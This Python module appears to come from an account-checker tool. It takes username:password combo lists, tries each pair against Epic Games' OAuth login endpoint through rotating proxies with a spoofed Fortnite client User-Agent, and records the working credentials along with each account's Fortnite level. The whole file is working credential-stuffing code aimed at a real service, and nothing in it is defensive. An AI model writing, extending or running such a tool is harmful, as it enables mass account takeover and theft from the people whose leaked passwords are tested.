import requests
import json
import re
from utils.values import settings, accounts, Proxies
from utils.utilities import proxy_getter

header_one = {
    'User-Agent': "Fortnite/++Fortnite+Release-4.5-CL-4166199 Windows/6.2.9200.1.768.64bit",
    'Authorization': settings.fortnite.authkey,
    'Content-Type': "application/x-www-form-urlencoded",
    'Accept': "*/*",
    'Cache-Control': "no-cache",
    'Host': "account-public-service-prod03.ol.epicgames.com",
    'accept-encoding': "gzip, deflate",
    'Connection': "keep-alive",
    'cache-control': "no-cache"
}


def check(x):
    combo = accounts.combos[x].strip()
    combo = combo.split(":")
    username = combo[0]
    password = ":".join(combo[1:])
    body = f"grant_type=password&username={username}&password={password}&includePerms=true"
    for x in range(0, int(settings.fortnite.max_errors_per_try1)):
        proxs_list = proxy_getter(__name__)
        try:
            r_one = requests.post(url="https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token",
                                  headers=header_one, data=body, timeout=settings.fortnite.timeout, proxies=proxs_list[1])
            r_one_json = r_one.json()
            account_id = r_one_json["account_id"]
            access_token = r_one_json["access_token"]
            account_level = stats(account_id=account_id, access_token=access_token, proxs_list=proxs_list)
            accounts.valid_fortnite.append(f"{username}:{password}:{account_level}")
            return
        except:
            continue
    accounts.invalid_fortnite.append(f"{username}:{password}")


def stats(account_id, access_token, proxs_list):
    body = "{}"
    header_two = {
        'Authorization': f"bearer {access_token}",
        'Content-Type': "application/json",
        'User-Agent': "PostmanRuntime/7.13.0",
        'Accept': "*/*",
        'Cache-Control': "no-cache",
        'Host': "fortnite-public-service-prod11.ol.epicgames.com",
        'accept-encoding': "gzip, deflate",
        'content-length': "2",
        'Connection': "keep-alive",
        'cache-control': "no-cache"
    }
    account_level = "Error"
    proxs_list = proxs_list
    for x in range(0, int(settings.fortnite.max_errors_per_try2)):
        try:
            r_two = requests.post(url=f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=athena",
                                  headers=header_two, data=body, timeout=settings.fortnite.timeout, proxies=proxs_list[1])
            r_two_json = r_two.json()
            account_level = r_two_json["profileChanges"][0]["profile"]["stats"]["attributes"]["accountLevel"]
            break
        except:
            proxs_list = proxy_getter(__name__)
            continue
    return account_level
